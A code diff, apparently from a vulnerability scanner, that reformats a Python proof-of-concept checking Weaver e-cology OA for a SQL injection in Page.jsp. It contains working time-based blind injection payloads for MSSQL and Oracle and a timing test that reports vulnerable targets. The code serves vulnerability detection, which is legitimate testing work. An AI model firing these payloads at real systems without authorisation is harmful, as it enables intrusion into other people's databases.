@@ -6,11 +6,12 @@ import re
 import md5
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0004' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0004'  # 平台漏洞编号，留空
     name = '泛微e-cology SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-10-10'  # 漏洞公布时间
     desc = '''
         泛微e-cology参数过滤不严谨，导致SQL注入漏洞。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '泛微OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd964980a-15ed-4209-aa07-98a55fb10427'
@@ -33,31 +35,33 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-078769
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-078769
             hh = hackhttp.hackhttp()
 
-            #MSSQL
+            # MSSQL
             payload1 = "/page/maint/login/Page.jsp?templateId=18%20waitfor%20delay%20'0:0:5'"
             payload2 = "/page/maint/login/Page.jsp?templateId=18%20waitfor%20delay%20'0:0:0'"
             t1 = time.time()
             code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
             t2 = time.time()
-            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
+            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
             t3 = time.time()
             if (t2 - t1 - t3 + t2 > 3):
                 #security_hole(_1+' has injection(MSSQL)')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
-            #Oracle
+            # Oracle
             else:
                 payload1 = "/page/maint/login/Page.jsp?templateId=18%20and%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(199)||CHR(81)||CHR(109),5)"
                 payload2 = "/page/maint/login/Page.jsp?templateId=18%20and%201=1"
                 t1 = time.time()
-                code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
+                code1, head1, res1, errcode1, _1 = hh.http(
+                    self.target + payload1)
                 t2 = time.time()
-                code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
+                code2, head2, res2, errcode2, _2 = hh.http(
+                    self.target + payload2)
                 t3 = time.time()
                 if (t2 - t1 - t3 + t2 > 3):
                     #security_hole(_1+' has injection(Oracle)')
@@ -69,6 +73,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
